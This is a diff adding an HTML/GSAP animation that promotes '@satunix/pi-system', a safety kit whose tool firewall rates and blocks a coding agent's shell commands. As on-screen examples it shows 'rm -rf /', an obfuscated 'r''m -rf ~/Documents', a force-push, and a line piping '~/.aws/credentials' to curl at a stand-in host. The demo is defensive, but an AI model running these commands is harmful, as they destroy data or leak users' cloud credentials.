@@ -1,0 +1,306 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=1920, height=1080" />
+    <title>pi-system brag</title>
+    <script src="assets/vendor/gsap.min.js"></script>
+    <script src="assets/music-rms.js"></script>
+    <style>
+      @font-face { font-family: "Space Grotesk"; font-weight: 500; src: url("assets/fonts/space-grotesk-latin-500-normal.woff2") format("woff2"); font-display: block; }
+      @font-face { font-family: "Space Grotesk"; font-weight: 700; src: url("assets/fonts/space-grotesk-latin-700-normal.woff2") format("woff2"); font-display: block; }
+      @font-face { font-family: "JetBrains Mono"; font-weight: 400; src: url("assets/fonts/jetbrains-mono-latin-400-normal.woff2") format("woff2"); font-display: block; }
+      @font-face { font-family: "JetBrains Mono"; font-weight: 700; src: url("assets/fonts/jetbrains-mono-latin-700-normal.woff2") format("woff2"); font-display: block; }
+
+      :root {
+        --bg: #1f2123;
+        --panel: #161b22;
+        --panel-error: #2a1718;
+        --border: #30363d;
+        --text: #ffffff;
+        --muted: #a1abb5;
+        --lime: #c2fe0b;
+        --low: #3fb950;
+        --high: #f0883e;
+        --crit: #f85149;
+      }
+      * { margin: 0; padding: 0; box-sizing: border-box; }
+      html, body { width: 1920px; height: 1080px; overflow: hidden; background: var(--bg); }
+      #root { position: relative; width: 1920px; height: 1080px; overflow: hidden; background: var(--bg); color: var(--text); font-family: "Space Grotesk", ui-sans-serif, system-ui, sans-serif; }
+      .mono { font-family: "JetBrains Mono", ui-monospace, monospace; }
+      .scene { position: absolute; left: 0; top: 0; width: 1920px; height: 1080px; z-index: 2; }
+      .abs { position: absolute; }
+
+      /* audio-reactive glow (music RMS) */
+      #glow { position: absolute; left: 260px; top: -160px; width: 1400px; height: 1400px; z-index: 1; border-radius: 50%;
+        background: radial-gradient(closest-side, rgba(194,254,11,0.13), rgba(194,254,11,0.04) 55%, rgba(194,254,11,0) 100%); opacity: 0.4; }
+      #vignette { position: absolute; inset: 0; z-index: 3; pointer-events: none; background: radial-gradient(ellipse at center, rgba(0,0,0,0) 55%, rgba(0,0,0,0.38) 100%); }
+
+      /* ---------- Scene 1: hook ---------- */
+      #cap { left: 0; top: 118px; width: 1920px; text-align: center; font-weight: 700; font-size: 74px; letter-spacing: -0.02em; opacity: 0; }
+      #cap .r { color: var(--crit); }
+      #term { left: 300px; top: 300px; width: 1320px; height: 560px; background: var(--panel); border: 2px solid var(--border); border-radius: 22px; overflow: hidden; opacity: 0; }
+      #termbar { height: 64px; display: flex; align-items: center; gap: 12px; padding: 0 26px; border-bottom: 2px solid var(--border); background: #1b2028; font-size: 26px; color: var(--muted); }
+      #termbar i { width: 16px; height: 16px; border-radius: 50%; background: #3a424d; display: block; }
+      #termbar span { margin-left: 14px; }
+      #termbody { padding: 38px 52px; }
+      #toolline { font-size: 30px; color: var(--muted); }
+      #toolline b { color: var(--lime); font-weight: 700; }
+      #cmdrow { display: flex; align-items: center; margin-top: 30px; font-size: 104px; font-weight: 700; height: 132px; }
+      #cmdrow .prompt { color: var(--lime); margin-right: 34px; }
+      #typed1 { display: block; flex: 0 0 auto; width: 0; overflow: hidden; white-space: nowrap; }
+      #cursor1 { width: 54px; height: 96px; background: var(--lime); margin-left: 8px; }
+      #verdict { display: flex; align-items: center; gap: 30px; margin-top: 44px; opacity: 0; }
+      #stamp { background: var(--crit); color: #1f2123; font-weight: 700; font-size: 44px; padding: 8px 26px; border-radius: 10px; letter-spacing: 0.04em; }
+      #denied { font-size: 72px; font-weight: 700; color: var(--crit); letter-spacing: -0.01em; }
+      #reason { margin-top: 22px; font-size: 34px; color: var(--muted); opacity: 0; }
+
+      /* ---------- Scene 2: reveal ---------- */
+      #pi { left: 476px; top: 170px; width: 384px; height: 384px; }
+      .blk { position: absolute; width: 96px; height: 96px; background: #fff; opacity: 0; }
+      #wordmark { left: 930px; top: 372px; width: 620px; height: 222px; clip-path: inset(0 100% 0 0); }
+      #wordmark img { width: 620px; height: 222px; display: block; }
+      #tag { left: 0; top: 720px; width: 1920px; text-align: center; font-weight: 500; font-size: 64px; letter-spacing: -0.01em; opacity: 0; }
+      #tag .l { color: var(--lime); font-weight: 700; }
+
+      /* ---------- Scene 3: firewall ---------- */
+      #fwlabel { left: 160px; top: 96px; font-size: 40px; color: var(--muted); opacity: 0; }
+      #fwlabel b { color: var(--lime); font-weight: 700; }
+      .row { position: absolute; left: 160px; width: 1600px; height: 146px; background: var(--panel); border: 2px solid var(--border); border-radius: 18px; display: flex; align-items: center; padding: 0 40px 0 44px; opacity: 0; }
+      .row .bar { position: absolute; left: 0; top: 0; bottom: 0; width: 12px; border-radius: 18px 0 0 18px; opacity: 0; }
+      .row .cmd { flex: 1; min-width: 0; }
+      .row .cmd .c { font-size: 36px; font-weight: 700; white-space: nowrap; }
+      .row .cmd .w { font-size: 27px; color: var(--muted); margin-top: 10px; white-space: nowrap; }
+      .row .chip { font-size: 32px; font-weight: 700; padding: 8px 22px; border-radius: 10px; color: #1f2123; letter-spacing: 0.04em; opacity: 0; }
+      .row .vd { width: 230px; text-align: right; font-size: 46px; font-weight: 700; opacity: 0; }
+      #r1 { top: 190px; } #r2 { top: 366px; } #r3 { top: 542px; } #r4 { top: 718px; }
+      #r4.crit { background: var(--panel-error); }
+
+      /* ---------- Scene 4: profiles ---------- */
+      #ph { left: 0; top: 130px; width: 1920px; text-align: center; font-size: 88px; font-weight: 700; letter-spacing: -0.02em; opacity: 0; }
+      #ph .l { color: var(--lime); }
+      #psub { left: 0; top: 262px; width: 1920px; text-align: center; font-size: 42px; color: var(--muted); opacity: 0; }
+      #psub b { color: var(--lime); font-weight: 700; }
+      .pc { position: absolute; width: 380px; height: 170px; background: var(--panel); border: 2px solid var(--border); border-radius: 18px; padding: 32px 28px; opacity: 0; }
+      .pc .n { font-size: 36px; white-space: nowrap; font-weight: 700; }
+      .pc .t { font-size: 28px; color: var(--muted); margin-top: 12px; }
+      #pc1 { left: 158px; top: 420px; } #pc2 { left: 566px; top: 420px; } #pc3 { left: 974px; top: 420px; } #pc4 { left: 1382px; top: 420px; }
+      #pc5 { left: 362px; top: 640px; } #pc6 { left: 770px; top: 640px; } #pc7 { left: 1178px; top: 640px; }
+
+      /* ---------- Scene 5: outro ---------- */
+      #ask { left: 0; top: 190px; width: 1920px; text-align: center; font-size: 150px; font-weight: 700; letter-spacing: -0.03em; opacity: 0; }
+      #ask .l { color: var(--lime); }
+      #install { left: 210px; top: 470px; width: 1500px; height: 128px; background: var(--panel); border: 2px solid var(--border); border-radius: 20px; display: flex; align-items: center; padding: 0 44px; font-size: 44px; font-weight: 700; opacity: 0; }
+      #install .prompt { color: var(--lime); margin-right: 22px; }
+      #typed2 { display: block; flex: 0 0 auto; width: 0; overflow: hidden; white-space: nowrap; }
+      #cursor2 { width: 26px; height: 54px; background: var(--lime); margin-left: 6px; }
+      #endrow { left: 0; top: 700px; width: 1920px; display: flex; align-items: center; justify-content: center; gap: 40px; opacity: 0; }
+      #endrow .pkg { font-size: 84px; font-weight: 700; letter-spacing: -0.02em; }
+      #endrow .lic { font-size: 40px; color: var(--muted); border: 2px solid var(--border); border-radius: 12px; padding: 8px 20px; }
+      #minipi { position: relative; width: 120px; height: 120px; flex: 0 0 120px; }
+      .mblk { position: absolute; width: 30px; height: 30px; background: #fff; }
+      #robot { left: 1520px; top: 806px; width: 300px; height: 248px; opacity: 0; }
+      #robot img { width: 300px; height: 248px; display: block; }
+      #here { left: 1180px; top: 928px; font-size: 34px; font-weight: 700; color: var(--lime); letter-spacing: 0.06em; transform: rotate(-7deg); opacity: 0; white-space: nowrap; }
+    </style>
+  </head>
+  <body>
+    <div id="root" data-composition-id="main" data-start="0" data-duration="21.5" data-width="1920" data-height="1080">
+      <div id="glow"></div>
+      <div id="vignette"></div>
+
+      <!-- ===== Scene 1: hook 0 - 3.55 ===== -->
+      <section id="s1" class="clip scene" data-start="0" data-duration="3.55" data-track-index="1">
+        <div id="cap" class="abs">Your agent just tried to <span class="r">delete everything.</span></div>
+        <div id="term" class="abs">
+          <div id="termbar" class="mono"><i></i><i></i><i></i><span>pi · bash tool call</span></div>
+          <div id="termbody" class="mono">
+            <div id="toolline">agent → <b>bash</b></div>
+            <div id="cmdrow"><span class="prompt">$</span><span id="typed1">rm -rf /</span><span id="cursor1"></span></div>
+            <div id="verdict"><span id="stamp" class="mono">CRITICAL</span><span id="denied">DENIED</span></div>
+            <div id="reason">recursively deletes /</div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ===== Scene 2: reveal 3.55 - 7.35 ===== -->
+      <section id="s2" class="clip scene" data-start="3.55" data-duration="3.8" data-track-index="1">
+        <div id="pi" class="abs">
+          <div class="blk" style="left:0;top:0"></div><div class="blk" style="left:96px;top:0"></div><div class="blk" style="left:192px;top:0"></div>
+          <div class="blk" style="left:0;top:96px"></div><div class="blk" style="left:192px;top:96px"></div>
+          <div class="blk" style="left:0;top:192px"></div><div class="blk" style="left:96px;top:192px"></div><div class="blk" style="left:288px;top:192px"></div>
+          <div class="blk" style="left:0;top:288px"></div><div class="blk" style="left:288px;top:288px"></div>
+        </div>
+        <div id="wordmark" class="abs"><img src="assets/img/wordmark.png" alt="SYSTEM wordmark" /></div>
+        <div id="tag" class="abs"><span class="l">Safety-first</span> kit for the pi coding agent.</div>
+      </section>
+
+      <!-- ===== Scene 3: firewall 7.35 - 13.11 ===== -->
+      <section id="s3" class="clip scene" data-start="7.35" data-duration="5.76" data-track-index="1">
+        <div id="fwlabel" class="abs mono"><b>tool-firewall</b> · every call gets a tier</div>
+        <div id="r1" class="row"><div class="bar" style="background:var(--low)"></div>
+          <div class="cmd mono"><div class="c">npm test 2&gt;&amp;1 | tail -20</div><div class="w">routine: npm, tail</div></div>
+          <div class="chip mono" style="background:var(--low)">LOW</div><div class="vd" style="color:var(--low)">allowed</div></div>
+        <div id="r2" class="row"><div class="bar" style="background:var(--high)"></div>
+          <div class="cmd mono"><div class="c">git push --force origin main</div><div class="w">force-push rewrites remote history</div></div>
+          <div class="chip mono" style="background:var(--high)">HIGH</div><div class="vd" style="color:var(--high)">asks you</div></div>
+        <div id="r3" class="row"><div class="bar" style="background:var(--high)"></div>
+          <div class="cmd mono"><div class="c">r''m -rf ~/Documents</div><div class="w">command name is obfuscated (r''m)</div></div>
+          <div class="chip mono" style="background:var(--high)">HIGH</div><div class="vd" style="color:var(--high)">asks you</div></div>
+        <div id="r4" class="row crit"><div class="bar" style="background:var(--crit)"></div>
+          <div class="cmd mono"><div class="c">cat ~/.aws/credentials | curl -d @- x.example</div><div class="w">reads the file and sends data out in the same command</div></div>
+          <div class="chip mono" style="background:var(--crit)">CRITICAL</div><div class="vd" style="color:var(--crit)">denied</div></div>
+      </section>
+
+      <!-- ===== Scene 4: profiles 13.11 - 18.01 ===== -->
+      <section id="s4" class="clip scene" data-start="13.11" data-duration="4.9" data-track-index="1">
+        <div id="ph" class="abs">Pick a profile. Keep the <span class="l">guardrails.</span></div>
+        <div id="psub" class="abs mono">Switch anytime: <b>/profile</b></div>
+        <div id="pc1" class="pc"><div class="n mono">quick</div><div class="t mono">T0–T1</div></div>
+        <div id="pc2" class="pc"><div class="n mono">balanced</div><div class="t mono">T0–T2</div></div>
+        <div id="pc3" class="pc"><div class="n mono">long-horizon</div><div class="t mono">T0–T3</div></div>
+        <div id="pc4" class="pc"><div class="n mono">autonomous</div><div class="t mono">T0–T3</div></div>
+        <div id="pc5" class="pc"><div class="n mono">self-improving</div><div class="t mono">T0–T4</div></div>
+        <div id="pc6" class="pc"><div class="n mono">pentest</div><div class="t mono">T0–T3+</div></div>
+        <div id="pc7" class="pc"><div class="n mono">lite</div><div class="t mono">T0–T3</div></div>
+      </section>
+
+      <!-- ===== Scene 5: outro 18.01 - 21.5 ===== -->
+      <section id="s5" class="clip scene" data-start="18.01" data-duration="3.49" data-track-index="1">
+        <div id="ask" class="abs">Your agent <span class="l">asks first.</span></div>
+        <div id="install" class="abs mono"><span class="prompt">$</span><span id="typed2">node packages/core/install.mjs --profile balanced</span><span id="cursor2"></span></div>
+        <div id="endrow" class="abs">
+          <div id="minipi">
+            <div class="mblk" style="left:0;top:0"></div><div class="mblk" style="left:30px;top:0"></div><div class="mblk" style="left:60px;top:0"></div>
+            <div class="mblk" style="left:0;top:30px"></div><div class="mblk" style="left:60px;top:30px"></div>
+            <div class="mblk" style="left:0;top:60px"></div><div class="mblk" style="left:30px;top:60px"></div><div class="mblk" style="left:90px;top:60px"></div>
+            <div class="mblk" style="left:0;top:90px"></div><div class="mblk" style="left:90px;top:90px"></div>
+          </div>
+          <div class="pkg">@satunix/pi-system</div>
+          <div class="lic mono">MIT</div>
+        </div>
+        <div id="here" class="abs mono">SATUNIX WAS HERE</div>
+        <div id="robot" class="abs"><img src="assets/img/robot.png" alt="pi-system robot" /></div>
+      </section>
+
+      <!-- ===== Audio ===== -->
+      <audio id="music" data-start="0" data-duration="21.5" data-track-index="10" data-volume="0.32" data-fade-in="0.6" data-fade-out="1.4" src="assets/music/happy-beats-business-moves-vol-10-by-ende-dot-app.mp3"></audio>
+
+      <!-- S1: typing ticks + stamp -->
+      <audio id="k1" data-start="0.50" data-duration="0.3" data-track-index="11" data-volume="0.35" src="assets/sfx/keyboard/keypress-001.wav"></audio>
+      <audio id="k2" data-start="0.64" data-duration="0.3" data-track-index="12" data-volume="0.35" src="assets/sfx/keyboard/keypress-004.wav"></audio>
+      <audio id="k3" data-start="0.78" data-duration="0.3" data-track-index="13" data-volume="0.35" src="assets/sfx/keyboard/keypress-002.wav"></audio>
+      <audio id="k4" data-start="0.92" data-duration="0.3" data-track-index="14" data-volume="0.35" src="assets/sfx/keyboard/keypress-005.wav"></audio>
+      <audio id="stampsfx" data-start="1.32" data-duration="0.6" data-track-index="15" data-volume="0.70" src="assets/sfx/impact/impactSoft_medium_001.ogg"></audio>
+      <!-- S2 -->
+      <audio id="reveal" data-start="3.50" data-duration="0.6" data-track-index="16" data-volume="0.60" src="assets/sfx/impact/impactSoft_medium_003.ogg"></audio>
+      <audio id="wm" data-start="4.05" data-duration="0.6" data-track-index="17" data-volume="0.45" src="assets/sfx/interface/drop_001.ogg"></audio>
+      <!-- S3 rows -->
+      <audio id="rw1" data-start="8.17" data-duration="0.60" data-track-index="18" data-volume="0.40" src="assets/sfx/casino/card-slide-1.ogg"></audio>
+      <audio id="rw2" data-start="9.24" data-duration="0.60" data-track-index="19" data-volume="0.40" src="assets/sfx/casino/card-slide-1.ogg"></audio>
+      <audio id="rw3" data-start="10.33" data-duration="0.60" data-track-index="20" data-volume="0.40" src="assets/sfx/casino/card-slide-1.ogg"></audio>
+      <audio id="rw4" data-start="11.42" data-duration="0.60" data-track-index="21" data-volume="0.40" src="assets/sfx/casino/card-slide-1.ogg"></audio>
+      <audio id="ck1" data-start="8.47" data-duration="0.05" data-track-index="22" data-volume="0.30" src="assets/sfx/interface/click_003.ogg"></audio>
+      <audio id="ck2" data-start="9.54" data-duration="0.05" data-track-index="23" data-volume="0.30" src="assets/sfx/interface/click_003.ogg"></audio>
+      <audio id="ck3" data-start="10.63" data-duration="0.05" data-track-index="24" data-volume="0.30" src="assets/sfx/interface/click_003.ogg"></audio>
+      <audio id="bong" data-start="11.70" data-duration="0.12" data-track-index="25" data-volume="0.55" src="assets/sfx/interface/bong_001.ogg"></audio>
+      <!-- S4 chips on the beat -->
+      <audio id="ch1" data-start="13.61" data-duration="0.11" data-track-index="26" data-volume="0.34" src="assets/sfx/interface/drop_001.ogg"></audio>
+      <audio id="ch2" data-start="14.17" data-duration="0.19" data-track-index="27" data-volume="0.30" src="assets/sfx/interface/drop_002.ogg"></audio>
+      <audio id="ch3" data-start="14.70" data-duration="0.11" data-track-index="28" data-volume="0.30" src="assets/sfx/interface/drop_001.ogg"></audio>
+      <audio id="ch4" data-start="15.25" data-duration="0.19" data-track-index="29" data-volume="0.30" src="assets/sfx/interface/drop_002.ogg"></audio>
+      <audio id="ch5" data-start="15.79" data-duration="0.11" data-track-index="30" data-volume="0.30" src="assets/sfx/interface/drop_001.ogg"></audio>
+      <audio id="ch6" data-start="16.35" data-duration="0.19" data-track-index="31" data-volume="0.30" src="assets/sfx/interface/drop_002.ogg"></audio>
+      <audio id="ch7" data-start="16.90" data-duration="0.11" data-track-index="32" data-volume="0.36" src="assets/sfx/interface/drop_001.ogg"></audio>
+      <!-- S5 -->
+      <audio id="slam" data-start="17.98" data-duration="0.18" data-track-index="33" data-volume="0.70" src="assets/sfx/impact/impactSoft_medium_001.ogg"></audio>
+      <audio id="i1" data-start="18.70" data-duration="0.3" data-track-index="34" data-volume="0.32" src="assets/sfx/keyboard/keypress-003.wav"></audio>
+      <audio id="i2" data-start="18.88" data-duration="0.3" data-track-index="35" data-volume="0.32" src="assets/sfx/keyboard/keypress-006.wav"></audio>
+      <audio id="i3" data-start="19.06" data-duration="0.3" data-track-index="36" data-volume="0.32" src="assets/sfx/keyboard/keypress-001.wav"></audio>
+      <audio id="i4" data-start="19.24" data-duration="0.3" data-track-index="37" data-volume="0.32" src="assets/sfx/keyboard/keypress-005.wav"></audio>
+      <audio id="i5" data-start="19.42" data-duration="0.3" data-track-index="38" data-volume="0.32" src="assets/sfx/keyboard/keypress-002.wav"></audio>
+      <audio id="enter" data-start="19.88" data-duration="0.05" data-track-index="39" data-volume="0.34" src="assets/sfx/interface/click_003.ogg"></audio>
+      <audio id="bell" data-start="20.15" data-duration="0.65" data-track-index="40" data-volume="0.62" src="assets/sfx/impact/impactBell_heavy_003.ogg"></audio>
+      <audio id="pop" data-start="20.50" data-duration="0.19" data-track-index="41" data-volume="0.38" src="assets/sfx/interface/drop_002.ogg"></audio>
+    </div>
+
+    <script>
+      window.__timelines = window.__timelines || {};
+      const tl = gsap.timeline({ paused: true });
+      const E = "power3.out";
+
+      /* ---- audio-reactive glow: precomputed music RMS, pure function of time ---- */
+      const gl = document.getElementById("glow");
+      const drive = { t: 0, gain: 0.35 };
+      tl.to(drive, { t: 21.5, duration: 21.5, ease: "none", onUpdate() {
+        const i = Math.max(0, Math.min(window.MUSIC_RMS.length - 1, Math.round(drive.t * 30)));
+        const r = window.MUSIC_RMS[i];
+        gl.style.opacity = (0.28 + r * 0.55) * drive.gain;
+        gl.style.transform = "scale(" + (1 + r * 0.05) + ")";
+      } }, 0);
+      tl.to(drive, { gain: 1, duration: 0.6, ease: "none" }, 3.4);
+
+      /* ---- Scene 1: hook ---- */
+      tl.fromTo("#cap", { opacity: 0, y: 26 }, { opacity: 1, y: 0, duration: 0.4, ease: E }, 0.1);
+      tl.fromTo("#term", { opacity: 0, y: 36, scale: 0.98 }, { opacity: 1, y: 0, scale: 1, duration: 0.4, ease: E }, 0.15);
+      tl.to("#typed1", { width: "8ch", duration: 0.56, ease: "steps(8)" }, 0.5);           // typed: keys at 0.50-0.92
+      [[1.1, 0], [1.25, 1], [1.4, 0]].forEach(([t, o]) => tl.set("#cursor1", { opacity: o }, t));
+      tl.set("#cursor1", { opacity: 0 }, 1.37);
+      // beat-locked: 1.37s (stamp)
+      tl.set("#verdict", { opacity: 1 }, 1.37);
+      tl.fromTo("#stamp", { scale: 1.9, rotation: -8, opacity: 0 }, { scale: 1, rotation: -2, opacity: 1, duration: 0.22, ease: "power4.out" }, 1.37);
+      tl.fromTo("#denied", { x: -30, opacity: 0 }, { x: 0, opacity: 1, duration: 0.3, ease: E }, 1.5);
+      tl.to("#term", { borderColor: "#f85149", backgroundColor: "#2a1718", duration: 0.2, ease: "none" }, 1.37);
+      tl.fromTo("#term", { x: 0 }, { x: 0, duration: 0.01 }, 1.37);
+      tl.to("#term", { x: 10, duration: 0.05, ease: "none" }, 1.4).to("#term", { x: -8, duration: 0.05, ease: "none" }, 1.45).to("#term", { x: 0, duration: 0.08, ease: "none" }, 1.5);
+      tl.fromTo("#reason", { opacity: 0, y: 12 }, { opacity: 1, y: 0, duration: 0.35, ease: E }, 1.7);
+      tl.to("#s1", { opacity: 0, duration: 0.2, ease: "none" }, 3.35);
+
+      /* ---- Scene 2: reveal (3.55) ---- */
+      // beat-locked: 3.55s (first block)
+      const blks = document.querySelectorAll("#pi .blk");
+      blks.forEach((b, i) => tl.fromTo(b, { opacity: 0, scale: 0.2 }, { opacity: 1, scale: 1, duration: 0.22, ease: "back.out(2.2)" }, 3.55 + i * 0.045));
+      tl.to("#wordmark", { clipPath: "inset(0 0% 0 0)", duration: 0.5, ease: "power2.out" }, 4.1);
+      tl.fromTo("#tag", { opacity: 0, y: 30 }, { opacity: 1, y: 0, duration: 0.45, ease: E }, 4.64);
+      tl.to("#s2", { opacity: 0, x: -60, duration: 0.25, ease: "power2.in" }, 7.1);
+
+      /* ---- Scene 3: firewall (7.35) ---- */
+      tl.fromTo("#fwlabel", { opacity: 0, y: -16 }, { opacity: 1, y: 0, duration: 0.35, ease: E }, 7.5);
+      // beat-grid (every other beat, text stays readable): rows at 8.22, 9.29, 10.38, 11.47
+      [["#r1", 8.22], ["#r2", 9.29], ["#r3", 10.38], ["#r4", 11.47]].forEach(([id, t]) => {
+        tl.fromTo(id, { opacity: 0, x: 90 }, { opacity: 1, x: 0, duration: 0.3, ease: E }, t);
+        tl.to(id + " .bar", { opacity: 1, duration: 0.05 }, t + 0.25);
+        tl.fromTo(id + " .chip", { opacity: 0, scale: 1.6 }, { opacity: 1, scale: 1, duration: 0.2, ease: "power4.out" }, t + 0.25);
+        tl.fromTo(id + " .vd", { opacity: 0, x: 24 }, { opacity: 1, x: 0, duration: 0.25, ease: E }, t + 0.32);
+      });
+      tl.fromTo("#r4", { borderColor: "#30363d" }, { borderColor: "#f85149", duration: 0.2, ease: "none" }, 11.72);
+      tl.to("#s3", { opacity: 0, x: -60, duration: 0.25, ease: "power2.in" }, 12.86);
+
+      /* ---- Scene 4: profiles (13.11) ---- */
+      tl.fromTo("#ph", { opacity: 0, y: 30 }, { opacity: 1, y: 0, duration: 0.4, ease: E }, 13.15);
+      tl.fromTo("#psub", { opacity: 0, y: 20 }, { opacity: 1, y: 0, duration: 0.35, ease: E }, 13.45);
+      // beat-grid: chips on consecutive beats 13.64 ... 16.93
+      ["13.64", "14.20", "14.73", "15.28", "15.82", "16.38", "16.93"].forEach((t, i) => {
+        tl.fromTo("#pc" + (i + 1), { opacity: 0, y: -50, scale: 0.94 }, { opacity: 1, y: 0, scale: 1, duration: 0.28, ease: "back.out(1.8)" }, parseFloat(t));
+      });
+      tl.to("#pc2", { borderColor: "#c2fe0b", duration: 0.25, ease: "none" }, 17.15);
+      tl.to("#s4", { opacity: 0, duration: 0.2, ease: "none" }, 17.8);
+
+      /* ---- Scene 5: outro (18.01) ---- */
+      // beat-locked: 18.01s (punchline, strong cue)
+      tl.fromTo("#ask", { opacity: 0, scale: 1.14 }, { opacity: 1, scale: 1, duration: 0.3, ease: "power4.out" }, 18.01);
+      tl.fromTo("#install", { opacity: 0, y: 30 }, { opacity: 1, y: 0, duration: 0.35, ease: E }, 18.5);
+      tl.to("#typed2", { width: "50ch", duration: 1.2, ease: "steps(50)" }, 18.7);
+      [[19.9, 0], [20.05, 1]].forEach(([t, o]) => tl.set("#cursor2", { opacity: o }, t));
+      // beat-locked: 20.19s (end card, strongest cue)
+      tl.to("#ask", { y: -50, duration: 0.4, ease: "power2.inOut" }, 20.15);
+      tl.to("#install", { y: -50, duration: 0.4, ease: "power2.inOut" }, 20.15);
+      tl.fromTo("#endrow", { opacity: 0, y: 40, scale: 0.94 }, { opacity: 1, y: 0, scale: 1, duration: 0.4, ease: "back.out(1.6)" }, 20.19);
+      tl.fromTo("#robot", { opacity: 0, y: 120 }, { opacity: 1, y: 0, duration: 0.45, ease: "back.out(1.4)" }, 20.5);
+      tl.fromTo("#here", { opacity: 0, x: -20 }, { opacity: 1, x: 0, duration: 0.3, ease: E }, 20.75);
+
+      window.__timelines["main"] = tl;
+      tl.seek(0);
+    </script>
+  </body>
+</html>
